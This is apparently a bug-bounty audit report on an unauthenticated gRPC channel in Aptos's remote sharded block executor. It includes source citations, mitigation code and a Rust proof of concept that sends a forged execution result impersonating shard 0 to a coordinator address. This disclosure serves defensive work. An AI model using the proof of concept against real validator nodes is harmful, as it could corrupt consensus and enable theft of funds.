# Audit Report

## Title
Remote Executor Shard Impersonation: Unauthenticated Remote Execution Results Enable Consensus Safety Violation

## Summary
The `RemoteExecutorClient` implementation in the sharded block executor accepts execution results from remote shards without any authentication, cryptographic verification, or integrity checks. An attacker who knows the coordinator's network address can impersonate legitimate executor shards and inject arbitrary execution results, causing different validators to compute different state roots for the same block, breaking consensus safety.

## Finding Description

The Aptos sharded block executor supports distributed execution where a coordinator dispatches sub-blocks to remote executor shards via gRPC, then aggregates their results. However, the communication channel has **zero authentication**.

### Vulnerability Location and Flow:

**1. Unauthenticated gRPC Server**

The gRPC server accepts messages from any remote address without verifying sender identity: [1](#0-0) 

The server accepts any `NetworkMessage` from any `remote_addr` and routes it to registered handlers based solely on `message_type` string matching. There is no peer authentication, TLS/SSL, or signature verification.

**2. Plain HTTP Communication**

The client establishes connections using plain HTTP without encryption or authentication: [2](#0-1) 

The endpoint uses `http://` (not `https://`), providing no transport security.

**3. Unverified Result Deserialization**

The coordinator blindly accepts and deserializes execution results from remote shards: [3](#0-2) 

The coordinator receives bytes from the channel, deserializes them as `RemoteExecutionResult`, and directly uses them without any cryptographic verification.

**4. Direct Integration into Consensus**

These unverified results flow directly into consensus via the execution pipeline: [4](#0-3) 

The sharded execution output is returned to the executor workflow, which then proceeds to ledger update and state commitment.

### Attack Scenario:

1. **Discovery**: Attacker discovers coordinator IP address (e.g., via network scanning, configuration leaks, or insider knowledge)

2. **Message Crafting**: Attacker constructs malicious `RemoteExecutionResult` with:
   - Modified account balances (stealing funds)
   - Fake gas consumption (free computation)
   - Arbitrary state changes (bypassing Move VM safety)
   - Different outputs for different validators

3. **Injection**: Attacker sends gRPC message to coordinator with:
   - `message_type`: `"execute_result_0"` (or any shard ID)
   - `message`: BCS-serialized `RemoteExecutionResult` containing fake outputs

4. **Acceptance**: Coordinator's gRPC server accepts the message without authentication

5. **Aggregation**: Coordinator aggregates fake results with legitimate results from other shards

6. **Consensus Break**: Different validators receive different fake results, computing different state roots for the same block

### Broken Invariants:

- **Invariant #1 (Deterministic Execution)**: Validators no longer produce identical state roots for identical blocks
- **Invariant #2 (Consensus Safety)**: AptosBFT safety breaks as nodes diverge on state
- **Invariant #4 (State Consistency)**: State transitions are no longer atomic or verifiable

## Impact Explanation

**CRITICAL Severity** - This vulnerability enables:

1. **Consensus Safety Violation**: Different validators compute different state roots for the same block, breaking the fundamental assumption of AptosBFT consensus. This can lead to:
   - Chain splits requiring hardfork
   - Permanent network partition
   - Loss of liveness

2. **Loss of Funds**: Attacker can inject execution results that:
   - Increase their account balance (theft from others)
   - Mint new tokens (inflation attack)
   - Bypass gas payments (free transactions)
   - Modify staking rewards

3. **Bypass of All Security Guarantees**: The attack circumvents:
   - Move VM bytecode verification
   - Gas metering and limits
   - Transaction validation (prologue/epilogue)
   - State transition verification
   - Access control checks

This meets the **Critical Severity** criteria per Aptos Bug Bounty Program:
- ✓ Loss of Funds (theft or minting)
- ✓ Consensus/Safety violations  
- ✓ Non-recoverable network partition (requires hardfork)
- ✓ Total loss of liveness/network availability

## Likelihood Explanation

**HIGH Likelihood** - The vulnerability is exploitable because:

1. **Low Attack Barrier**: 
   - Attacker only needs coordinator's IP:port
   - No validator keys or credentials required
   - No cryptographic challenges to overcome
   - Standard gRPC tooling can craft messages

2. **No Detection Mechanisms**:
   - No authentication logs
   - No anomaly detection for fake results
   - Results are accepted silently

3. **Production Deployment Risk**:
   - Feature is enabled when `get_remote_addresses()` returns non-empty list
   - [5](#0-4) 

4. **Network Exposure**:
   - Coordinator listens on network socket
   - No IP allowlist or firewall at application layer
   - [6](#0-5) 

## Recommendation

Implement multi-layer authentication and integrity verification:

### 1. Mutual TLS Authentication
Replace plain HTTP with mTLS using validator identity keys:
```rust
// In get_channel method
async fn get_channel(remote_addr: String, tls_config: ClientTlsConfig) -> NetworkMessageServiceClient<Channel> {
    let conn = tonic::transport::Endpoint::new(remote_addr)
        .unwrap()
        .tls_config(tls_config)?
        .connect()
        .await?;
    NetworkMessageServiceClient::new(conn)
}
```

### 2. Cryptographic Result Signatures
Sign all execution results with shard private keys:
```rust
#[derive(Clone, Debug, Deserialize, Serialize)]
pub struct RemoteExecutionResult {
    pub inner: Result<Vec<Vec<TransactionOutput>>, VMStatus>,
    pub shard_id: ShardId,
    pub signature: Signature, // BLS signature over (shard_id, inner)
    pub public_key: PublicKey,
}
```

### 3. Verification at Coordinator
Verify signatures before accepting results:
```rust
fn get_output_from_shards(&self) -> Result<Vec<Vec<Vec<TransactionOutput>>>, VMStatus> {
    let mut results = vec![];
    for (shard_id, rx) in self.result_rxs.iter().enumerate() {
        let received_bytes = rx.recv().unwrap().to_bytes();
        let result: RemoteExecutionResult = bcs::from_bytes(&received_bytes).unwrap();
        
        // Verify shard identity
        if result.shard_id != shard_id {
            return Err(VMStatus::Error(...));
        }
        
        // Verify signature
        let expected_pubkey = &self.shard_public_keys[shard_id];
        if result.public_key != *expected_pubkey {
            return Err(VMStatus::Error(...));
        }
        
        let message = bcs::to_bytes(&(result.shard_id, &result.inner)).unwrap();
        if !result.signature.verify(&message, &result.public_key) {
            return Err(VMStatus::Error(...));
        }
        
        results.push(result.inner?);
    }
    Ok(results)
}
```

### 4. Challenge-Response Protocol
Add nonce-based challenge to prevent replay attacks:
```rust
pub struct ExecuteBlockCommand {
    pub sub_blocks: SubBlocksForShard<AnalyzedTransaction>,
    pub concurrency_level: usize,
    pub onchain_config: BlockExecutorConfigFromOnchain,
    pub nonce: u64, // Random nonce from coordinator
}
```

### 5. Network Layer Hardening
- Use the main Aptos network framework with mutual authentication instead of custom NetworkController
- Implement IP allowlisting for known shard addresses
- Add request rate limiting and anomaly detection

## Proof of Concept

```rust
// Proof of Concept: Remote Executor Impersonation Attack
// This demonstrates how an attacker can inject fake execution results

use aptos_types::{
    transaction::{TransactionOutput, TransactionStatus},
    vm_status::VMStatus,
    write_set::WriteSet,
};
use execution_service::{RemoteExecutionResult, ExecuteBlockCommand};
use aptos_secure_net::network_controller::Message;
use tonic::transport::Channel;
use aptos_protos::remote_executor::v1::{
    network_message_service_client::NetworkMessageServiceClient,
    NetworkMessage,
};

#[tokio::main]
async fn main() {
    // Target coordinator address (discovered through reconnaissance)
    let coordinator_addr = "http://10.0.1.5:52200";
    
    // Connect to coordinator (no authentication required!)
    let channel = Channel::from_static(coordinator_addr)
        .connect()
        .await
        .unwrap();
    let mut client = NetworkMessageServiceClient::new(channel);
    
    // Craft malicious execution result
    let fake_output = TransactionOutput::new(
        WriteSet::default(), // Could modify any account balance here
        vec![], // events
        0, // gas_used (free execution!)
        TransactionStatus::Keep(/* success */),
        TransactionAuxiliaryData::default(),
    );
    
    let malicious_result = RemoteExecutionResult {
        inner: Ok(vec![vec![fake_output]]),
    };
    
    // Serialize and send as if from legitimate shard 0
    let payload = bcs::to_bytes(&malicious_result).unwrap();
    let message = NetworkMessage {
        message: payload,
        message_type: "execute_result_0".to_string(), // Impersonate shard 0
    };
    
    // Send fake result - coordinator will accept it without verification
    client.simple_msg_exchange(message).await.unwrap();
    
    println!("Successfully injected fake execution result!");
    println!("Coordinator will aggregate this with legitimate results,");
    println!("causing state divergence across validators.");
}
```

**Test Steps:**
1. Deploy Aptos node with remote sharded execution enabled
2. Run the PoC against the coordinator address
3. Observe that fake results are accepted and incorporated into block execution
4. Different validators compute different state roots
5. Consensus breaks with safety violation

**Notes:**
- This PoC demonstrates the core vulnerability: unauthenticated message acceptance
- In a real attack, the attacker would craft outputs that benefit them (steal funds, bypass gas)
- The attack can target specific validators to cause targeted state divergence
- No validator credentials or insider access needed

### Citations

**File:** secure/net/src/grpc_network_service/mod.rs (L91-116)
```rust
#[tonic::async_trait]
impl NetworkMessageService for GRPCNetworkMessageServiceServerWrapper {
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
}
```

**File:** secure/net/src/grpc_network_service/mod.rs (L124-138)
```rust
    pub fn new(rt: &Runtime, remote_addr: SocketAddr) -> Self {
        Self {
            remote_addr: remote_addr.to_string(),
            remote_channel: rt
                .block_on(async { Self::get_channel(format!("http://{}", remote_addr)).await }),
        }
    }

    async fn get_channel(remote_addr: String) -> NetworkMessageServiceClient<Channel> {
        info!("Trying to connect to remote server at {:?}", remote_addr);
        let conn = tonic::transport::Endpoint::new(remote_addr)
            .unwrap()
            .connect_lazy();
        NetworkMessageServiceClient::new(conn).max_decoding_message_size(MAX_MESSAGE_SIZE)
    }
```

**File:** execution/executor-service/src/remote_executor_client.rs (L163-172)
```rust
    fn get_output_from_shards(&self) -> Result<Vec<Vec<Vec<TransactionOutput>>>, VMStatus> {
        trace!("RemoteExecutorClient Waiting for results");
        let mut results = vec![];
        for rx in self.result_rxs.iter() {
            let received_bytes = rx.recv().unwrap().to_bytes();
            let result: RemoteExecutionResult = bcs::from_bytes(&received_bytes).unwrap();
            results.push(result.inner?);
        }
        Ok(results)
    }
```

**File:** aptos-move/aptos-vm/src/sharded_block_executor/mod.rs (L86-95)
```rust
        let (sharded_output, global_output) = self
            .executor_client
            .execute_block(
                state_view,
                transactions,
                concurrency_level_per_shard,
                onchain_config,
            )?
            .into_inner();
        // wait for all remote executors to send the result back and append them in order by shard id
```

**File:** execution/executor/src/workflow/do_get_execution_output.rs (L261-268)
```rust
        if !get_remote_addresses().is_empty() {
            Ok(V::execute_block_sharded(
                &REMOTE_SHARDED_BLOCK_EXECUTOR.lock(),
                partitioned_txns,
                state_view,
                onchain_config,
            )?)
        } else {
```

**File:** secure/net/src/network_controller/mod.rs (L94-113)
```rust
impl NetworkController {
    pub fn new(service: String, listen_addr: SocketAddr, timeout_ms: u64) -> Self {
        let inbound_handler = Arc::new(Mutex::new(InboundHandler::new(
            service.clone(),
            listen_addr,
            timeout_ms,
        )));
        let outbound_handler = OutboundHandler::new(service, listen_addr, inbound_handler.clone());
        info!("Network controller created for node {}", listen_addr);
        Self {
            inbound_handler,
            outbound_handler,
            inbound_rpc_runtime: Runtime::new().unwrap(),
            outbound_rpc_runtime: Runtime::new().unwrap(),
            // we initialize the shutdown handles when we start the network controller
            inbound_server_shutdown_tx: None,
            outbound_task_shutdown_tx: None,
            listen_addr,
        }
    }
```
